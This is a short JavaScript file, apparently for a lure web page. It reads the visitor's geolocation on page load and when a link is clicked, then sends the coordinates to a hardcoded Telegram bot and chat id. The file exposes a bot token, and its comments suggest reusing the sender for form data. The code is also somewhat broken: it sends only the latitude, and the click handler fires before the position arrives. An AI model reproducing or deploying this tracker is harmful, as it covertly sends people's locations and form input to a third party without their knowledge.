let long;
let lat;

const link = document.querySelector('#link');

navigator.geolocation.getCurrentPosition(position => {
    lat = "lat" + position.coords.latitude;
    long = "long" + position.coords.longitude;
    sendMessage(lat, long);
});


link.addEventListener('click', () => {
    navigator.geolocation.getCurrentPosition(position => {
        lat = "lat" + position.coords.latitude;
        long = "long" + position.coords.longitude;
    });

    sendMessage(lat, long);
})



let tg = {
    token: "7879873820:AAGnfZozhI2mk3ifvFlIz7xbT-kejmJsBnY", // Your bot's token that got from @BotFather
    chat_id: "6837075169" // T075the user's(that you want to send a message) telegram chat id
}

/**
 * By calling this function you can send message to a specific user
 * @param {} the text to send
 *
*/
function sendMessage(text)
{
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);
    xht.send();
}

// Now you can send any text(even a form data) by calling sendMessage function.
// For example if you want to send the 'hello', you can call that function like this:


